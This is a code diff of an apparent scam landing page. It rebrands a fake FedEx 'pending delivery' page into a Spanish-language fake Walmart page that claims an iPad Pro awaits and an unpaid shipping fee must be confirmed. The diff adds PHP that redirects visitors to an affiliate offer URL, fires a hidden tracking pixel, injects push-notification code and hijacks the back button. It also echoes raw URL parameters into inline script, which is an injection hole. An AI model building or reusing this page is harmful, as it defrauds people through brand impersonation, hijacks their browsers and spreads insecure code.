@@ -1,13 +1,81 @@
-<html class="no-js" lang="en">
+<html class="no-js" lang="es">
+
+<?php
+// w4 logo
+
+$page_peel_brand = "";
+  if ($_GET['s'] == "1016") {
+$page_peel_brand = <<<page_peel_brand
+<script type="text/javascript" src="/utils/banners/banner-brnd.js"></script>
+<style>
+img.banner {
+    position: fixed;
+    top: 0;
+    width: 150px;
+    z-index: 999999999999;
+}
+</style>
+page_peel_brand;
+  }
+// This is index-rp-nl-nw-exc.php - No Logo - New Window - Exclude by EPV
+session_start();
+require_once dirname(__FILE__) . "/../wall/nas-functions.php";
+if(isset($_GET['nasTag']) && !empty($_GET['nasTag'])) {
+  $tag = $_GET['nasTag'];
+} else {
+  $tag = "";
+}
+
+$data = GetNasWall("", null, $tag)[0];
+
+require_once(dirname(__FILE__) . "/../helpers.php");
+if (getcwd() === "/var/surveys/redzun") {
+    include("_php_voluum_clock_or_lptoken_check-w14.php");
+} else {
+    include(dirname(__FILE__) . "/../_php_voluum_clock_or_lptoken_check-w14.php");
+}
+
+if (isset($_GET['cc'])) $country = strtolower($_GET['cc']); // country must be defined for include
+  else $country = 'us';
+
+$_SESSION['cc'] = $country; // Set Country ID
+
+if (isset($_GET['wid'])) $wid = strtolower($_GET['wid']); // Wall ID
+  else $wid = 'default';
+
+$_SESSION['wid'] = $_GET['wid']; // Set Wall ID
+
+$offer_parameters = "?c=" . $_GET['c']."&k="."&v=".$_GET['v']."&s=".$_GET['s']."&t=".$_GET['t']."&cr=".$_GET['cr']."&src=".$_GET['src']."&lp=".$_GET['lp']."&id=".$_GET['id'];
+$offer_url = "https://" . $offer_link_domain_fold . "/de7d783b-d901-4973-8080-b75e3e249c7c". $offer_parameters;
+
+?>
+<script>
+  function r(b,a){return++a?String.fromCharCode((b<"["?91:123)>(b=b.charCodeAt()+13)?b:b-26):b.replace(/[a-zA-Z]/g,r)}
+  pr_name = "<?php echo str_rot13(""); ?>";
+
+
+</script>
+
+<script>
+ 			window.c_var = '<?=!empty($_GET['c']) ? $_GET['c'] : ""?>';
+			window.k_var = '<?=!empty($_GET['k']) ? str_rot13($_GET['k']) : ""?>';
+			window.s_var = '<?=!empty($_GET['s']) ? $_GET['s'] : ""?>';
+			window.src_var = '<?=!empty($_GET['src']) ? $_GET['src'] : ""?>';
+			window.id_var = '<?=!empty($_GET['id']) ? $_GET['id'] : ""?>';
+			
+			var jumpurl;
+      jumpurl = '<?php echo $data->url ?>';
+ </script>
 
 <head>
+    <base href="new-folder">
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
-    <title>Track &amp; Trace</title>
+    <title>Seguimiento y Rastreo</title>
     <meta name="description" content="" />
     <meta name="author" content="front-man.com" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes" />
-    <link rel="icon" type="image/png" sizes="32x32" href=./files/fx-favicon.ico />
+    <link rel="icon" type="image/png" sizes="32x32" href=wal_favicon.png />
     <!-- Chrome Android color -->
     <meta name="theme-color" content="#fff" />
     <!-- Fonts -->
@@ -142,12 +210,12 @@
     <style>
         .step--current,
         .step--done {
-            border-color: FF6600;
+            border-color: #0071CE;
         }
 
         .step--current::before,
         .step--done::before {
-            background-color: FF6600;
+            background-color: #0071CE;
             opacity: 1;
         }
 
@@ -157,37 +225,37 @@
         }
 
         .step--done::after {
-            background-color: FF6600 !important;
+            background-color: #0071CE !important;
         }
 
         .btn {
-            background-color: FF6600;
+            background-color: #0071CE;
             color: #fff
         }
 
         .btn:hover {
-            background-color: rgb(255, 122, 34)
+            background-color: #0071CE
         }
 
         .question__answers label::after {
             width: 10px;
             height: 10px;
 
-            background-color: FF6600;
+            background-color: #0071CE;
             opacity: 0;
             margin-left: 3px;
         }
 
         .question__answers input:checked+label {
-            background-color: FF6600;
+            background-color: #0071CE;
         }
 
         body {
-            background-color: rgb(102, 27, 185);
+            background-color: #fff;
         }
 
         .page {
-            background-color: rgb(102, 27, 185);
+            background-color: #fff;
         }
     </style>
 </head>
@@ -196,11 +264,11 @@
     <div class="page">
         <!-- HEADER -->
         <header class="header"
-            style="height: 60px; display: flex; justify-content: center; align-items: center; background-color: #4D148C">
+            style="height: 60px; display: flex; justify-content: center; align-items: center; background-color: #0071CE">
             <div class="container"
                 style="max-width: 400px; width: 100%; height: 60px; display: flex; align-items: center; position: relative;">
                 <div class="left-image" style="position: absolute; left: 10px;">
-                    <img src=./files/fedxfav.png style="width: 64px; height: auto;" />
+                    <img src="./files/wal_logo.png" style="width: 90px; height: auto;" />
                 </div>
                 <div class="right-images" style="height: 30px; width: 100px; margin-left: auto; display: flex; gap: 10px;">
                     <img src="https://www.freeiconspng.com/thumbs/search-icon-png/search-icon-png-5.png"
@@ -217,17 +285,17 @@
         <!-- Screen 1 -->
         <main class="main main--1">
             <div class="card">
-                <h2 class="title">Entrega pendiente</h2>
+                <h2 class="title">ENTREGA PENDIENTE</h2>
                 <span class="badge" data-badge="!"><img src="./files/icon-box.svg" alt="" /></span>
 
                 <dl class="tracking-code">
-                    <dt> Tienes (1) paquete en espera. </dt>
+                    <dt> Tiene (1) paquete en espera. </dt>
                 </dl>
                 <div class="card2">
                     <div id="dateDisplay5" style="font-size: 10px; color: #333; text-align: left;"></div>
                     <div class="circle-container">
                         <div class="glowing-circle-green"></div>
-                        <p class="circle-text">&nbsp;Tu paquete fue recogido</p>
+                        <p class="circle-text">&nbsp;Su paquete fue recogido</p>
 
                     </div>
                     <p style="font-size: 12px; color: #333; text-align: left;">
@@ -238,7 +306,7 @@
                     <div id="dateDisplay2" style="font-size: 10px; color: #333; text-align: left;"></div>
                     <div class="circle-container">
                         <div class="glowing-circle-green"></div>
-                        <p class="circle-text">&nbsp;¡Su paquete está preparado para la entrega!</p>
+                        <p class="circle-text">&nbsp;¡Su paquete está listo para la entrega!</p>
                     </div><br />
                     <div id="dateDisplay0" style="font-size: 10px; color: #333; text-align: left;"></div>
 
@@ -251,9 +319,9 @@
                             document.getElementById(elementId).textContent = dateString;
                         }
 
-                        const date5 = displayDate("dateDisplay5", 5, "en-US");
-                        const date2 = displayDate("dateDisplay2", 2, "en-US");
-                        const date0 = displayDate("dateDisplay0", 0, "en-US");
+                        const date5 = displayDate("dateDisplay5", 5, "es");
+                        const date2 = displayDate("dateDisplay2", 2, "es");
+                        const date0 = displayDate("dateDisplay0", 0, "es");
                     </script>
                     <div class="circle-container">
                         <div class="glowing-circle-red"></div>
@@ -263,23 +331,23 @@
                     </div>
                     <p style="font-size: 12px; color: #333; text-align: left;">
                         &nbsp;&nbsp;-
-                        Confirme los detalles de la entrega en la página siguiente
+                        Confirme los detalles de entrega en la siguiente página
                     </p>
                     <p style="font-size: 12px; color: #333; text-align: left;">
                         &nbsp;&nbsp;-
-                        Tarifa de entrega no pagada por el proveedor
+                        El costo de envío no fue pagado por el vendedor
                     </p>
                 </div>
 
                 <dl class="tracking-code">
-                    <dt> Confirme sus detalles de entrega en la página siguiente</dt>
+                    <dt> Confirme sus detalles de entrega en la siguiente página</dt>
                 </dl>
                 <hr />
 
                 <dl class="tracking-code">
                     <br />
 
-                    <dt>Tu código de seguimiento</dt>
+                    <dt>Su código de seguimiento</dt>
                     <dd>AIPD-1512-KL10</dd>
                 </dl>
             </div>
@@ -298,9 +366,9 @@
                 </svg>
 
                 <ul class="loading-list">
-                    <li>Localización de su paquete ...</li>
-                    <li>Buscando el número de seguimiento ...</li>
-                    <li>Buscando opciones de entrega ...</li>
+                    <li>Localizando su paquete...</li>
+                    <li>Buscando el número de seguimiento...</li>
+                    <li>Buscando opciones de entrega...</li>
                 </ul>
             </div>
         </main>
@@ -321,7 +389,7 @@
                         <h3 class="subtitle">Información del paquete:</h3>
                         <hr />
                         <dl class="tracking-code2">
-                            <dt>Contenido:</dt>
+                            <dt>Contenido por guía:</dt>
                             <dd>iPad Pro</dd>
                         </dl>
                         <dl class="tracking-code2">
@@ -329,8 +397,8 @@
                             <dd>Listo para enviar</dd>
                         </dl>
                         <dl class="tracking-code2">
-                            <dt>Envío a través de:</dt>
-                            <dd>FedEx</dd>
+                            <dt>Envío vía:</dt>
+                            <dd>Walmart</dd>
                         </dl>
                         <dl class="tracking-code2">
                             <dt>Costo de envío:</dt>
@@ -341,7 +409,7 @@
                 </div>
             </div>
 
-            <button type="button" class="btn screen-trigger--2">Programar entrega ahora
+            <button type="button" class="btn screen-trigger--2">Programe su entrega ahora
                 ></button>
         </main>
 
@@ -369,7 +437,7 @@
                                         d="M0 0h1v1H0V0zm2 0h7v1H2V0zm21.5 18h1v1h-1v-1zm-17 0h1v1h-1v-1zM22 12h6.3L26 8.5h-4V12zm2 3.5c1.5 0 2.7 1.1 3 2.5h2v-1h-1.5v-1H29v-2.9l-.1-.1h-7.4c-.3 0-.5-.2-.5-.5V8c0-.3.2-.5.5-.5h3.9l-.6-1H20V18h1c.3-1.4 1.5-2.5 3-2.5zm2 3c0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2 2-.9 2-2zm-19-3c1.5 0 2.7 1.1 3 2.5h9v-1h-8.5v-1H19V5H2V4h17V3H1v13h2.5v1H1v1h3c.3-1.4 1.5-2.5 3-2.5zm0 6c-1.5 0-2.7-1.1-3-2.5H.5c-.3 0-.5-.2-.5-.5v-16c0-.2.2-.5.5-.5h19c.3 0 .5.3.5.5v3h5c.2 0 .3.1.4.2l4.5 7c.1.1.1.2.1.3v5.5c0 .3-.2.5-.5.5H27c-.2 1.4-1.5 2.5-3 2.5s-2.7-1.1-3-2.5H10c-.3 1.5-1.5 2.5-3 2.5zm2-3c0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2 2-.9 2-2z">
                                     </path>
                                 </svg>
-                                <span>Entrega de hogar/trabajo</span>
+                                <span>Entrega en casa/trabajo</span>
                             </label>
 
                             <input type="radio" id="question01b" name="question01" disabled />
@@ -379,13 +447,13 @@
                                         d="M17.8 12.7v8.9c0 .2-.2.4-.4.4H4.7c-.2 0-.4-.2-.4-.4v-8.9c0-.2.2-.4.4-.4h12.7c.2-.1.4.1.4.4zm-.9.4H5.1v8h11.8v-8zm12.2 10.8c0 .2-.2.4-.4.4H1.4c-.2 0-.4-.2-.4-.4s.2-.4.4-.4h.5v-13C.7 9.7 0 8.4 0 7c0-.1 0-.2.1-.2L3.6.7c.2-.4.6-.7 1.1-.7h20.5c.5 0 1 .3 1.2.7l3.5 6.1c.1.1.1.1.1.2 0 1.4-.8 2.7-1.9 3.4v13h.5c.3.1.5.3.5.5zm-25-13.7C5.7 10.2 7 9 7.2 7.5h-3c-.2 0-.4-.2-.4-.5s.2-.4.4-.4h21.6c.2 0 .4.2.4.4s-.2.5-.4.5h-3.1c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8h-1.4c-.2 0-.4-.2-.4-.4s.2-.4.4-.4h1.1l-3.1-5.4c-.1-.2-.3-.3-.4-.3H4.7c-.1-.1-.3 0-.4.1L1.2 6.6h1.1c.2 0 .4.2.4.5 0 .2-.2.4-.4.4H.9c.2 1.5 1.6 2.7 3.2 2.7zm11.4-2.7c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8h-6.4zm-7.3 0c.2 1.6 1.6 2.8 3.2 2.8s2.9-1.2 3.2-2.8H8.2zM24.9 22h-4.8v1.5h4.8V22zm0-8.9h-4.8v8h4.8v-8zm2.3-2.2c-1.9.7-4-.2-5-2-.7 1.4-2.1 2.2-3.6 2.2s-2.9-.9-3.6-2.2c-.7 1.4-2.1 2.2-3.6 2.2s-2.9-.9-3.6-2.2c-.9 1.8-3 2.7-5 2v12.6h16.5V12.7c0-.2.2-.4.4-.4h5.6c.2 0 .4.2.4.4v10.8h1.5V10.9z">
                                     </path>
                                 </svg>
-                                <span>Levantar</span>
+                                <span>Voy a recogerlo yo mismo</span>
                             </label>
                         </div>
                     </div>
 
                     <div class="question question--2">
-                        <h2 class="subtitle">¿Dónde quieres que se entregue?</h2>
+                        <h2 class="subtitle">¿Dónde desea que se entregue?</h2>
 
                         <div class="question__answers">
                             <input type="radio" id="question02a" name="question02" />
@@ -411,7 +479,7 @@
                     </div>
 
                     <div class="question question--3">
-                        <h2 class="subtitle">¿Cuándo le gustaría su entrega?</h2>
+                        <h2 class="subtitle">¿Cuándo desea su entrega?</h2>
 
                         <div class="question__answers">
                             <input type="radio" id="question03a" name="question03" />
@@ -421,7 +489,7 @@
                                         d="M21.7 19.8c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-3.6c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.7 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.4.5c-.3 0-.6-.2-.6-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm18.1-4c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5c-.2 0-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zm-3.6 0c0-.3.2-.5.5-.5s.5.2.5.5-.2.5-.5.5-.5-.2-.5-.5zM26 2v22H0V2h5.8C6 .8 7.1 0 8.3 0c1.4 0 2.6 1.1 2.6 2.5S9.7 5 8.3 5c-.3 0-.5-.2-.5-.5S8 4 8.3 4c.9 0 1.6-.7 1.6-1.5S9.2 1 8.3 1c-.6 0-1.2.4-1.4 1h.9c.3 0 .5.2.5.5s-.2.5-.5.5H1v4.6h24V3h-4.8c-.2 1.2-1.3 2-2.5 2-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S18.6 1 17.7 1c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c1.2 0 2.3.9 2.5 2H26zM14 .5c0-.3.3-.5.6-.5 1.4 0 2.6 1.1 2.6 2.5S16 5 14.6 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S15.5 1 14.6 1c-.3 0-.6-.2-.6-.5zm-3.1 0c0-.3.2-.5.5-.5C12.9 0 14 1.1 14 2.5S12.8 5 11.4 5c-.3 0-.5-.2-.5-.5s.2-.5.5-.5c.9 0 1.6-.7 1.6-1.5S12.3 1 11.4 1c-.2 0-.5-.2-.5-.5zM25 8.6H1V23h24V8.6z">
                                     </path>
                                 </svg>
-                                <span>Día laborable</span>
+                                <span>Día de semana</span>
                             </label>
 
                             <input type="radio" id="question03b" name="question03" />
@@ -455,7 +523,7 @@
                 </svg>
 
                 <ul class="loading-list">
-                    <li>Guardar sus preferencias...</li>
+                    <li>Guardando sus preferencias...</li>
                     <li>Confirmando su paquete...</li>
                     <li>¡El paquete está reservado!</li>
                 </ul>
@@ -470,38 +538,39 @@
                 <li class="step step--current"></li>
             </ol>
             <div class="card">
-                <h2 class="title title--primary">Confirmación de pedido</h2>
+                <h2 class="title title--primary">CONFIRMACIÓN DE PEDIDO</h2>
                 <center><img src="img.jpg" alt="" /></center>
-                <h3 class="subtitle" style="margin-bottom: 15px;">Entrega esperada:<br />
+                <h3 class="subtitle" style="margin-bottom: 15px;">Entrega estimada:<br />
                     <div id="futureDateDisplay" style="font-size: 16px; font-weight: 600; color: #333;"></div>
 
                     <script>
-                        const date9 = displayDate("futureDateDisplay", -4, "en-US");
+                        const date9 = displayDate("futureDateDisplay", -4, "es");
                     </script>
 
-                    <span class="time-delivery">Entre las 8:30 a.m. a las 6:00 p.m.</span>
+                    <span class="time-delivery">Entre las 8:30 am y las 6:00 pm</span>
                 </h3>
                 <p style="font-size: 14px; font-weight: 500; color: #333;">
-                    1. Serás redirigido a la página del proveedor.</p>
+                    1. Será redirigido a la página del vendedor.</p>
                 <p style="font-size: 14px; font-weight: 500; color: #333;">
-                    2. Confirme sus datos y tarifa de entrega.
+                    2. Confirme sus datos y el costo de envío.
                 </p>
                 <p style="font-size: 14px; font-weight: 500; color: #333;">
-                    3. Una vez completado, la fecha de entrega esperada se enumera anteriormente.
+                    3. Una vez completado, la fecha de entrega estimada se mostrará arriba.
                 </p>
 
             </div>
 
-            <a class="btn" id="button1">Página siguiente ></a>
+            <img src="<?php echo $data->impression_url ?>" style="display:none;"></img>
+            <a class="btn" id="button1">PÁGINA SIGUIENTE ></a>
             <p style="font-size: 14px; font-weight: 500; color: #333;">
                 *Se requiere firma al momento de la entrega
             </p>
         </main>
 
-        <div class="foot" style="background-color: #FF6600">
+        <div class="foot" style="background-color: #ffc220">
 
             <p style="font-size: 14px; font-weight: 500; color: #bfb8af;">
-                2024 © - Todos los derechos reservados
+                2024 © - todos los derechos reservados
             </p>
             <p style="font-size: 14px; font-weight: 500; color: #bfb8af;">
                 Sitio | Cuentas | Preguntas frecuentes | Conectar
@@ -514,12 +583,34 @@
         </div>
     </div>
 </body>
-
 <script>
-    document.getElementById('button1').addEventListener("click", function () {
-        var urlParams = new URLSearchParams(window.location.search); //
-        window.location.href = jumpurl;
-    }, false);
+    document.getElementById('button1').addEventListener("click",function(){
+        var urlParams = new URLSearchParams(window.location.search);
+        
+        window.location.href = jumpurl ;
+    },false);
 </script>
+
+<?php
+		if (($_GET['nopush'] !== "1") && ($_GET['src'] !== "TV"))
+		{
+			$aff_id = "2";
+			if (!empty($_GET["s"])) {
+				$aff_id = $_GET["s"];
+			}
+			
+			$trk_urls = [
+				 "https://" . $_GET["trk"] . "/click/20"
+			];
+			
+			echo getPushCode("us", $aff_id, $trk_urls);
+		   }
+		?>
+		
+		<?php
+		$backbutton_url = "https://" . $_SERVER['HTTP_HOST'] . "/back-w14.php?c=" . $_GET['c'] . "&k=" . $_GET['k'] . "&id=" . $_GET['id'] . "&source=" . $_GET['source'];
+		
+		echo getBackButton($backbutton_url);
+?>
 
 </html>
